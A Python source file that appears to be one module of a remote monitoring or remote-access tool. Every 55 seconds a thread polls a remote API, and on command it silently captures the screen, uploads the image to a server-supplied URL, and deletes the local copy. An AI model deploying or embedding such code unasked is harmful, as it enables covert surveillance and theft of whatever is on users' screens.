import os
import threading
import pyautogui
import requests

from time import sleep


class Screenshot(threading.Thread):

    def __init__(self, api: str, key: str):
        super().__init__()
        self.name = "Screenshot"
        self.api = api
        self.key = key

    def run(self):
        while True:
            try:
                response = requests.get("https://" + self.api + "/screenshot",
                                         headers={"x-api-key": self.key})
                if response.ok:
                    # Take screenshot
                    pic = pyautogui.screenshot()
                    # Save the image
                    file_name = 'Screenshot.jpeg'
                    pic.save(file_name)
                    with open(file_name, "rb") as image_file:
                        files = {'file': (file_name, image_file, 'image/jpeg', {'Expires': '0'})}
                        upload = response.json()
                        upload_screenshot = requests.post(upload['url'], data=upload['fields'], files=files)
                        print('screen shot uploaded!')
                    os.remove(file_name)
                else:
                    print(response.status_code)
                    print(response.reason)

            except Exception as e:
                print(e)
            sleep(55)
